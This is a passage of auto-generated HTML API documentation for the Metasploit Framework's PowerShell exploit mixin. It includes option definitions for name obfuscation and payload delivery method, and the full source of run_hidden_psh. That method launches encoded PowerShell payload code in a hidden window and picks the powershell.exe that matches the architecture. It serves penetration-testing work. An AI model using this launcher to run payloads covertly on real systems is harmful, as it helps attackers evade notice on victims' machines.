      <span class='const'>OptBool</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::sub_vars</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Substitute variable names</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='kw'>false</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'>OptBool</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::sub_funcs</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Substitute function names</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='kw'>false</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'>OptEnum</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::method</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload delivery method</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>reflection</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='qwords_beg'>%w(</span><span class='tstring_content'>net</span><span class='words_sep'> </span><span class='tstring_content'>reflection</span><span class='words_sep'> </span><span class='tstring_content'>old</span><span class='words_sep'> </span><span class='tstring_content'>msil</span><span class='words_sep'>)</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
    <span class='rbracket'>]</span><span class='comma'>,</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_class'>class</span><span class='rparen'>)</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="run_hidden_psh-instance_method">
  
    - (<tt>String</tt>) <strong>run_hidden_psh</strong>(ps_code, payload_arch, encoded) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Wraps the powershell code to launch a hidden window and detect the
execution environment and spawn the appropriate powershell executable for
the payload architecture.</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>ps_code</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>Powershell code</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>payload_arch</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The payload architecture &#39;x86&#39;/&#39;x86_64&#39;</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>encoded</span>
      
      
        <span class='type'>(<tt>Boolean</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>Indicates whether ps_code is encoded or not</p>
</div>
      
    </li>
  
</ul>

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>Wrapped powershell code</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/powershell.rb', line 197</span>

<span class='kw'>def</span> <span class='id identifier rubyid_run_hidden_psh'>run_hidden_psh</span><span class='lparen'>(</span><span class='id identifier rubyid_ps_code'>ps_code</span><span class='comma'>,</span> <span class='id identifier rubyid_payload_arch'>payload_arch</span><span class='comma'>,</span> <span class='id identifier rubyid_encoded'>encoded</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_arg_opts'>arg_opts</span> <span class='op'>=</span> <span class='lbrace'>{</span>
    <span class='label'>noprofile:</span> <span class='kw'>true</span><span class='comma'>,</span>
    <span class='label'>windowstyle:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>hidden</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
  <span class='rbrace'>}</span>

  <span class='kw'>if</span> <span class='id identifier rubyid_encoded'>encoded</span>
    <span class='id identifier rubyid_arg_opts'>arg_opts</span><span class='lbracket'>[</span><span class='symbol'>:encodedcommand</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_ps_code'>ps_code</span>
  <span class='kw'>else</span>
    <span class='id identifier rubyid_arg_opts'>arg_opts</span><span class='lbracket'>[</span><span class='symbol'>:command</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_ps_code'>ps_code</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>&#39;</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>&#39;&#39;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
  <span class='kw'>end</span>

  <span class='comment'># Old technique fails if powershell exits..
</span>  <span class='id identifier rubyid_arg_opts'>arg_opts</span><span class='lbracket'>[</span><span class='symbol'>:noexit</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='kw'>true</span> <span class='kw'>if</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::method</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>old</span><span class='tstring_end'>&#39;</span></span>

  <span class='id identifier rubyid_ps_args'>ps_args</span> <span class='op'>=</span> <span class='id identifier rubyid_generate_psh_args'>generate_psh_args</span><span class='lparen'>(</span><span class='id identifier rubyid_arg_opts'>arg_opts</span><span class='rparen'>)</span>

  <span class='id identifier rubyid_process_start_info'>process_start_info</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;EOS</span>
<span class='tstring_content'>$s=New-Object System.Diagnostics.ProcessStartInfo
$s.FileName=$b
$s.Arguments=&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ps_args'>ps_args</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;
$s.UseShellExecute=$false
$p=[System.Diagnostics.Process]::Start($s)
</span><span class='heredoc_end'>EOS
</span>  <span class='id identifier rubyid_process_start_info'>process_start_info</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>

  <span class='id identifier rubyid_archictecure_detection'>archictecure_detection</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;EOS</span>
<span class='tstring_content'>if([IntPtr]::Size -eq 4){
</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_payload_arch'>payload_arch</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x86</span><span class='tstring_end'>&#39;</span></span> <span class='op'>?</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>$b=&#39;powershell.exe&#39;</span><span class='tstring_end'>&quot;</span></span> <span class='op'>:</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>$b=$env:windir+&#39;\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe&#39;</span><span class='tstring_end'>&quot;</span></span><span class='embexpr_end'>}</span><span class='tstring_content'>
}else{
</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_payload_arch'>payload_arch</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x86</span><span class='tstring_end'>&#39;</span></span> <span class='op'>?</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>$b=$env:windir+&#39;\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe&#39;</span><span class='tstring_end'>&quot;</span></span> <span class='op'>:</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>$b=&#39;powershell.exe&#39;</span><span class='tstring_end'>&quot;</span></span><span class='embexpr_end'>}</span><span class='tstring_content'>
};
</span><span class='heredoc_end'>EOS
</span>
  <span class='id identifier rubyid_archictecure_detection'>archictecure_detection</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>

  <span class='id identifier rubyid_archictecure_detection'>archictecure_detection</span> <span class='op'>+</span> <span class='id identifier rubyid_process_start_info'>process_start_info</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>

</div>

    <div id="footer">
  Generated on Wed Sep  3 01:51:13 2014 by
  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
  0.8.7.4 (ruby-2.1.2).
</div>

  </body>
</html>